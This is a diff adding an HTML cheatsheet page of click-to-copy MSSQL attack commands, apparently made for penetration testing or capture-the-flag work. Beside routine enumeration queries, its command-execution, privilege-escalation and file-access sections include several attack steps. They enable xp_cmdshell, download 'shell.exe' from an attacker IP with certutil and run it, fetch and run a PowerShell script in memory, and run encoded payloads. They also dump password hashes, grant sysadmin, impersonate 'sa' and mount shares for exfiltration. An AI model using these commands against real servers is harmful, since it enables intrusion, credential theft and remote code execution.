@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="../assets/components.js"></script>
+  <style>
+    .cs-search-wrap { position:relative; margin-bottom:18px; }
+    .cs-search-wrap input {
+      width:100%; background:var(--surface); border:1px solid var(--border);
+      border-radius:7px; padding:10px 14px 10px 38px;
+      font-family:var(--mono); font-size:12px; color:var(--text);
+      outline:none; transition:border-color .15s;
+    }
+    .cs-search-wrap input::placeholder { color:var(--muted); }
+    .cs-search-wrap input:focus { border-color:rgba(57,211,83,.5); }
+    .cs-search-ico { position:absolute; left:12px; top:50%; transform:translateY(-50%); color:var(--muted); pointer-events:none; font-size:15px; }
+
+    .filter-row { display:flex; flex-wrap:wrap; gap:6px; margin-bottom:24px; }
+    .pill {
+      font-size:11px; padding:4px 13px; border-radius:999px;
+      border:1px solid var(--border); cursor:pointer;
+      background:var(--surface); color:var(--muted);
+      font-family:var(--mono); transition:all .15s;
+    }
+    .pill:hover { color:var(--text); border-color:var(--surface2); }
+    .pill.active { background:var(--gglow); color:var(--green); border-color:rgba(57,211,83,.4); }
+
+    .cs-match-count { font-family:var(--mono); font-size:11px; color:var(--muted); margin-bottom:24px; }
+    .cs-match-count span { color:var(--green); }
+
+    .cs-category { margin-bottom:40px; scroll-margin-top:70px; }
+    .cs-cat-hdr {
+      display:flex; align-items:center; gap:14px;
+      margin-bottom:14px; padding-bottom:10px;
+      border-bottom:1px solid var(--border);
+    }
+    .cs-cat-title { font-family:var(--mono); font-size:15px; font-weight:500; color:var(--text); }
+    .cs-cat-meta { margin-left:auto; font-family:var(--mono); font-size:11px; color:var(--muted); }
+
+    .cl {
+      background:var(--surface2); border-radius:5px; padding:8px 12px;
+      font-family:var(--mono); font-size:12px; color:var(--muted);
+      display:flex; align-items:flex-start; gap:8px;
+      cursor:pointer; transition:all .15s;
+      border:1px solid transparent; position:relative;
+      margin-bottom:6px;
+    }
+    .cl:hover { background:var(--surface); border-color:var(--border); color:var(--text); }
+    .cl .dollar { color:var(--teal); flex-shrink:0; line-height:1.6; font-size:11px; }
+    .cl .ct { flex:1; line-height:1.6; word-break:break-all; }
+    .cl .desc { display:block; font-size:10px; color:var(--muted); margin-top:3px; font-style:italic; }
+    .cl .hint { font-size:10px; color:var(--muted); opacity:0; transition:opacity .15s; flex-shrink:0; padding-top:2px; }
+    .cl:hover .hint { opacity:1; }
+    .cl.copied { border-color:rgba(57,211,83,.4); background:rgba(57,211,83,.05); }
+    .cl.hidden { display:none; }
+
+    .kw  { color:var(--accent); }
+    .fn  { color:var(--purple); }
+    .str { color:var(--green); }
+    .arg { color:var(--orange); }
+    .op  { color:var(--yellow); }
+
+    .no-res { text-align:center; padding:60px 20px; font-family:var(--mono); color:var(--muted); display:none; }
+  </style>
+</head>
+<body>
+<div class="page-content">
+
+  <div class="cs-search-wrap">
+    <span class="cs-search-ico">⌕</span>
+    <input id="cs-q" type="text" placeholder="search commands, descriptions..." autocomplete="off" spellcheck="false">
+  </div>
+
+  <div class="filter-row" id="filters"></div>
+  <div class="cs-match-count">showing <span id="cs-count">—</span> commands</div>
+
+  <!-- AUTH -->
+  <div class="cs-category" id="cs-auth">
+    <div class="cs-cat-hdr">
+      <span class="cs-cat-num tag-blue">01</span>
+      <span class="cs-cat-title">Auth &amp; Linked Servers</span>
+      <span class="cs-cat-meta">impacket · sqsh · mssql-cli · openquery</span>
+    </div>
+    <div class="cl" data-cat="auth"><span class="dollar">$</span><span class="ct"><span class="kw">impacket-mssqlclient</span> <span class="arg">&lt;user&gt;</span>:<span class="arg">&lt;pass&gt;</span>@<span class="arg">&lt;ip&gt;</span><span class="desc">Connect to MSSQL via Impacket (SQL auth)</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="auth"><span class="dollar">$</span><span class="ct"><span class="kw">impacket-mssqlclient</span> <span class="arg">&lt;domain&gt;</span>/<span class="arg">&lt;user&gt;</span>:<span class="arg">&lt;pass&gt;</span>@<span class="arg">&lt;ip&gt;</span> <span class="op">-windows-auth</span><span class="desc">Connect using Windows / domain authentication</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="auth"><span class="dollar">$</span><span class="ct"><span class="kw">sqsh</span> <span class="op">-S</span> <span class="arg">&lt;ip&gt;</span> <span class="op">-U</span> <span class="arg">&lt;user&gt;</span> <span class="op">-P</span> <span class="arg">&lt;pass&gt;</span><span class="desc">Connect with sqsh client (alternative)</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="auth"><span class="dollar">$</span><span class="ct"><span class="kw">mssql-cli</span> <span class="op">-S</span> <span class="arg">&lt;ip&gt;</span> <span class="op">-U</span> <span class="arg">&lt;user&gt;</span> <span class="op">-P</span> <span class="arg">&lt;pass&gt;</span><span class="desc">Connect via Microsoft mssql-cli tool</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="auth"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">sp_linkedservers</span>;<span class="desc">List all linked servers configured on this instance</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="auth"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">sp_addlinkedserver</span> @server=<span class="str">'&lt;name&gt;'</span>, @srvproduct=<span class="str">''</span>, @provider=<span class="str">'SQLNCLI'</span>, @datasrc=<span class="str">'&lt;ip&gt;'</span>;<span class="desc">Add a new linked server (requires sysadmin)</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="auth"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">sp_addlinkedsrvlogin</span> <span class="str">'&lt;srv&gt;'</span>,<span class="str">'false'</span>,NULL,<span class="str">'&lt;user&gt;'</span>,<span class="str">'&lt;pass&gt;'</span>;<span class="desc">Set credentials for a linked server login</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="auth"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> * <span class="kw">FROM</span> <span class="fn">openquery</span>([<span class="arg">&lt;linked_srv&gt;</span>], <span class="str">'SELECT 1'</span>);<span class="desc">Execute a query on a linked server via openquery</span></span><span class="hint">copy</span></div>
+  </div>
+
+  <!-- ENUM -->
+  <div class="cs-category" id="cs-enum">
+    <div class="cs-cat-hdr">
+      <span class="cs-cat-num tag-teal">02</span>
+      <span class="cs-cat-title">Enumeration</span>
+      <span class="cs-cat-meta">version · users · databases · roles</span>
+    </div>
+    <div class="cl" data-cat="enum"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> @@version;<span class="desc">MSSQL version and build information</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="enum"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> @@servername;<span class="desc">Name of the current server instance</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="enum"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> <span class="fn">SYSTEM_USER</span>;<span class="desc">Currently logged-in SQL user</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="enum"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> <span class="fn">USER_NAME</span>();<span class="desc">Current database user context</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="enum"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> name <span class="kw">FROM</span> sys.databases;<span class="desc">List all databases on the instance</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="enum"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> name <span class="kw">FROM</span> sys.server_logins;<span class="desc">List all server-level logins</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="enum"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> name, is_sysadmin <span class="kw">FROM</span> sys.syslogins <span class="kw">WHERE</span> is_sysadmin=<span class="str">1</span>;<span class="desc">List all sysadmin accounts</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="enum"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> name, type_desc <span class="kw">FROM</span> sys.server_principals;<span class="desc">All server principals (logins, roles, etc.)</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="enum"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> <span class="fn">IS_SRVROLEMEMBER</span>(<span class="str">'sysadmin'</span>);<span class="desc">Check if current user is sysadmin (1 = yes)</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="enum"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> name, is_disabled <span class="kw">FROM</span> sys.server_principals <span class="kw">WHERE</span> type=<span class="str">'S'</span>;<span class="desc">List SQL logins and disabled status</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="enum"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">sp_helpdb</span>;<span class="desc">Show database metadata for all databases</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="enum"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> * <span class="kw">FROM</span> INFORMATION_SCHEMA.TABLES;<span class="desc">List tables in the current database</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="enum"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> TABLE_NAME <span class="kw">FROM</span> INFORMATION_SCHEMA.TABLES <span class="kw">WHERE</span> TABLE_TYPE=<span class="str">'BASE TABLE'</span>;<span class="desc">List only base tables (no views)</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="enum"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> COLUMN_NAME, DATA_TYPE <span class="kw">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="kw">WHERE</span> TABLE_NAME=<span class="str">'&lt;tbl&gt;'</span>;<span class="desc">List columns and types for a specific table</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="enum"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> * <span class="kw">FROM</span> <span class="arg">&lt;db&gt;</span>..<span class="arg">&lt;table&gt;</span>;<span class="desc">Query a table in another database without USE</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="enum"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">sp_configure</span>;<span class="desc">Show all server configuration options and current values</span></span><span class="hint">copy</span></div>
+  </div>
+
+  <!-- DB -->
+  <div class="cs-category" id="cs-db">
+    <div class="cs-cat-hdr">
+      <span class="cs-cat-num tag-purple">03</span>
+      <span class="cs-cat-title">Database Interaction</span>
+      <span class="cs-cat-meta">USE · SELECT · CREATE · hashes</span>
+    </div>
+    <div class="cl" data-cat="db"><span class="dollar"> </span><span class="ct"><span class="kw">USE</span> <span class="arg">&lt;database&gt;</span>;<span class="desc">Switch to a specific database</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="db"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> * <span class="kw">FROM</span> <span class="arg">&lt;table&gt;</span>;<span class="desc">Dump all rows from a table</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="db"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT TOP</span> <span class="str">10</span> * <span class="kw">FROM</span> <span class="arg">&lt;table&gt;</span>;<span class="desc">Retrieve first 10 rows from a table</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="db"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> * <span class="kw">FROM</span> <span class="arg">&lt;table&gt;</span> <span class="kw">WHERE</span> <span class="arg">&lt;col&gt;</span> <span class="kw">LIKE</span> <span class="str">'%&lt;val&gt;%'</span>;<span class="desc">Search for a value within a column</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="db"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> name, password_hash <span class="kw">FROM</span> sys.sql_logins;<span class="desc">Dump SQL login password hashes (sysadmin required)</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="db"><span class="dollar"> </span><span class="ct"><span class="kw">CREATE LOGIN</span> <span class="arg">&lt;user&gt;</span> <span class="kw">WITH PASSWORD</span>=<span class="str">'&lt;pass&gt;'</span>;<span class="desc">Create a new SQL login</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="db"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">sp_addsrvrolemember</span> <span class="str">'&lt;user&gt;'</span>,<span class="str">'sysadmin'</span>;<span class="desc">Add a user to the sysadmin role</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="db"><span class="dollar"> </span><span class="ct"><span class="kw">ALTER LOGIN</span> <span class="arg">&lt;user&gt;</span> <span class="kw">WITH PASSWORD</span>=<span class="str">'&lt;newpass&gt;'</span>;<span class="desc">Change a login's password</span></span><span class="hint">copy</span></div>
+  </div>
+
+  <!-- EXEC -->
+  <div class="cs-category" id="cs-exec">
+    <div class="cs-cat-hdr">
+      <span class="cs-cat-num tag-orange">04</span>
+      <span class="cs-cat-title">Command Execution</span>
+      <span class="cs-cat-meta">xp_cmdshell · PowerShell · certutil</span>
+    </div>
+    <div class="cl" data-cat="exec"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">sp_configure</span> <span class="str">'show advanced options'</span>,<span class="str">1</span>; <span class="kw">RECONFIGURE</span>;<span class="desc">Enable advanced config options — required before enabling xp_cmdshell</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="exec"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">sp_configure</span> <span class="str">'xp_cmdshell'</span>,<span class="str">1</span>; <span class="kw">RECONFIGURE</span>;<span class="desc">Enable xp_cmdshell — allows OS command execution</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="exec"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">xp_cmdshell</span> <span class="str">'whoami'</span>;<span class="desc">Execute an OS command via xp_cmdshell</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="exec"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">xp_cmdshell</span> <span class="str">'powershell -enc <span class="arg">&lt;b64payload&gt;</span>'</span>;<span class="desc">Execute a base64-encoded PowerShell payload</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="exec"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">xp_cmdshell</span> <span class="str">'certutil -urlcache -f http://<span class="arg">&lt;ip&gt;</span>/shell.exe C:\Windows\Temp\s.exe'</span>;<span class="desc">Download a file from attacker via certutil</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="exec"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">xp_cmdshell</span> <span class="str">'C:\Windows\Temp\s.exe'</span>;<span class="desc">Execute a dropped binary via xp_cmdshell</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="exec"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">xp_cmdshell</span> <span class="str">'powershell IEX(New-Object Net.WebClient).DownloadString("http://<span class="arg">&lt;ip&gt;</span>/shell.ps1")'</span>;<span class="desc">In-memory PowerShell download &amp; execute (no disk write)</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="exec"><span class="dollar"> </span><span class="ct"><span class="kw">DECLARE</span> @cmd <span class="fn">NVARCHAR</span>(4000); <span class="kw">SET</span> @cmd=<span class="str">'whoami'</span>; <span class="kw">EXEC</span> <span class="fn">xp_cmdshell</span> @cmd;<span class="desc">Dynamic xp_cmdshell execution via variable</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="exec"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">sp_execute_external_script</span> @language=N<span class="str">'Python'</span>, @script=N<span class="str">'import os; os.system("whoami")'</span>;<span class="desc">Execute Python if external scripts are enabled</span></span><span class="hint">copy</span></div>
+  </div>
+
+  <!-- PRIV -->
+  <div class="cs-category" id="cs-priv">
+    <div class="cs-cat-hdr">
+      <span class="cs-cat-num tag-red">05</span>
+      <span class="cs-cat-title">Privilege Escalation</span>
+      <span class="cs-cat-meta">impersonation · linked server exec · sysadmin</span>
+    </div>
+    <div class="cl" data-cat="priv"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> distinct b.name <span class="kw">FROM</span> sys.server_permissions a <span class="kw">INNER JOIN</span> sys.server_principals b <span class="kw">ON</span> a.grantor_principal_id=b.principal_id <span class="kw">WHERE</span> a.permission_name=<span class="str">'IMPERSONATE'</span>;<span class="desc">Find logins that can be impersonated</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="priv"><span class="dollar"> </span><span class="ct"><span class="kw">EXECUTE AS LOGIN</span> = <span class="str">'sa'</span>; <span class="kw">SELECT</span> <span class="fn">SYSTEM_USER</span>;<span class="desc">Impersonate the SA login (requires IMPERSONATE permission)</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="priv"><span class="dollar"> </span><span class="ct"><span class="kw">REVERT</span>;<span class="desc">Revert back to original login after impersonation</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="priv"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> * <span class="kw">FROM</span> <span class="fn">openquery</span>([<span class="arg">&lt;srv&gt;</span>],<span class="str">"SELECT IS_SRVROLEMEMBER('sysadmin')"</span>);<span class="desc">Check sysadmin role on a linked server</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="priv"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span>(<span class="str">'EXEC xp_cmdshell ''whoami'''</span>) <span class="kw">AT</span> [<span class="arg">&lt;linked_srv&gt;</span>];<span class="desc">Execute xp_cmdshell on a linked server via AT keyword</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="priv"><span class="dollar"> </span><span class="ct"><span class="kw">SELECT</span> * <span class="kw">FROM</span> <span class="fn">openquery</span>([<span class="arg">&lt;srv&gt;</span>],<span class="str">"EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"</span>);<span class="desc">Enable xp_cmdshell on a linked server via openquery</span></span><span class="hint">copy</span></div>
+  </div>
+
+  <!-- FILE -->
+  <div class="cs-category" id="cs-file">
+    <div class="cs-cat-hdr">
+      <span class="cs-cat-num tag-yellow">06</span>
+      <span class="cs-cat-title">File Access</span>
+      <span class="cs-cat-meta">xp_cmdshell · BULK INSERT · net use</span>
+    </div>
+    <div class="cl" data-cat="file"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">xp_cmdshell</span> <span class="str">'type C:\Users\Administrator\Desktop\root.txt'</span>;<span class="desc">Read a file via xp_cmdshell + type command</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="file"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">xp_cmdshell</span> <span class="str">'dir C:\Users\'</span>;<span class="desc">List directory contents via xp_cmdshell</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="file"><span class="dollar"> </span><span class="ct"><span class="kw">BULK INSERT</span> tempdb..tmp <span class="kw">FROM</span> <span class="str">'C:\Windows\win.ini'</span> <span class="kw">WITH</span> (ROWTERMINATOR=<span class="str">'\n'</span>);<span class="desc">Read a local file into a temp table using BULK INSERT</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="file"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">xp_fileexist</span> <span class="str">'C:\Windows\System32\cmd.exe'</span>;<span class="desc">Check if a file exists on the server (1 = exists)</span></span><span class="hint">copy</span></div>
+    <div class="cl" data-cat="file"><span class="dollar"> </span><span class="ct"><span class="kw">EXEC</span> <span class="fn">xp_cmdshell</span> <span class="str">'net use Z: \\<span class="arg">&lt;ip&gt;</span>\share <span class="arg">&lt;pass&gt;</span> /user:<span class="arg">&lt;domain&gt;</span>\<span class="arg">&lt;user&gt;</span>'</span>;<span class="desc">Mount a network share for file transfer / exfil</span></span><span class="hint">copy</span></div>
+  </div>
+
+  <div class="no-res" id="cs-no-res">
+    <div style="font-size:28px;margin-bottom:10px">⌕</div>
+    no commands matching that search
+  </div>
+
+</div>
+<script>
+  initPage({
+    title: 'MSSQL Command Reference',
+    breadcrumb: 'cheatsheets/mssql_command_reference',
+    tags: [{ label: 'MSSQL', color: 'blue' }, { label: 'click to copy', color: 'teal' }],
+    extraSb: `
+      <div style="padding:13px 10px 6px;border-top:1px solid var(--border)">
+        <div class="sb-sec-lbl">jump to</div>
+        <a href="#cs-auth" class="sb-item"><span class="sb-icon" style="color:var(--accent)">▸</span>Auth &amp; Links</a>
+        <a href="#cs-enum" class="sb-item"><span class="sb-icon" style="color:var(--teal)">▸</span>Enumeration</a>
+        <a href="#cs-db"   class="sb-item"><span class="sb-icon" style="color:var(--purple)">▸</span>Database</a>
+        <a href="#cs-exec" class="sb-item"><span class="sb-icon" style="color:var(--orange)">▸</span>Command Exec</a>
+        <a href="#cs-priv" class="sb-item"><span class="sb-icon" style="color:var(--red)">▸</span>Privilege Esc</a>
+        <a href="#cs-file" class="sb-item"><span class="sb-icon" style="color:var(--yellow)">▸</span>File Access</a>
+      </div>`,
+  });
+
+  const CATS = [
+    { id:'all',  label:'All' },
+    { id:'auth', label:'Auth / Links' },
+    { id:'enum', label:'Enumeration' },
+    { id:'db',   label:'Database' },
+    { id:'exec', label:'Command Exec' },
+    { id:'priv', label:'Privilege' },
+    { id:'file', label:'File Access' },
+  ];
+
+  let activeCat = 'all';
+  const filtersEl = document.getElementById('filters');
+  CATS.forEach(c => {
+    const btn = document.createElement('button');
+    btn.className = 'pill' + (c.id === 'all' ? ' active' : '');
+    btn.textContent = c.label;
+    btn.onclick = () => {
+      activeCat = c.id;
+      document.querySelectorAll('.pill').forEach(x => x.classList.remove('active'));
+      btn.classList.add('active');
+      applyFilters();
+    };
+    filtersEl.appendChild(btn);
+  });
+
+  document.querySelectorAll('.cl').forEach(el => {
+    el.addEventListener('click', () => {
+      const raw = el.querySelector('.ct').innerText.trim();
+      navigator.clipboard?.writeText(raw).then(() => {
+        el.classList.add('copied');
+        const hint = el.querySelector('.hint');
+        if (hint) { hint.textContent = '✓'; hint.style.color = 'var(--green)'; hint.style.opacity = '1'; }
+        setTimeout(() => {
+          el.classList.remove('copied');
+          if (hint) { hint.textContent = 'copy'; hint.style.color = ''; hint.style.opacity = ''; }
+        }, 1500);
+      });
+    });
+  });
+
+  const allCards = document.querySelectorAll('.cl');
+  const allCats  = document.querySelectorAll('.cs-category');
+  const countEl  = document.getElementById('cs-count');
+  const noResEl  = document.getElementById('cs-no-res');
+
+  function updateCount() {
+    countEl.textContent = document.querySelectorAll('.cl:not(.hidden)').length;
+  }
+
+  function applyFilters() {
+    const q = document.getElementById('cs-q').value.toLowerCase().trim();
+    let any = false;
+    allCards.forEach(c => {
+      const catMatch  = activeCat === 'all' || c.dataset.cat === activeCat;
+      const textMatch = !q || c.textContent.toLowerCase().includes(q);
+      const show = catMatch && textMatch;
+      c.classList.toggle('hidden', !show);
+      if (show) any = true;
+    });
+    allCats.forEach(cat => {
+      cat.style.display = cat.querySelectorAll('.cl:not(.hidden)').length === 0 ? 'none' : '';
+    });
+    noResEl.style.display = !any ? 'block' : 'none';
+    updateCount();
+  }
+
+  document.getElementById('cs-q').addEventListener('input', applyFilters);
+  updateCount();
+</script>
+</body>
+</html>
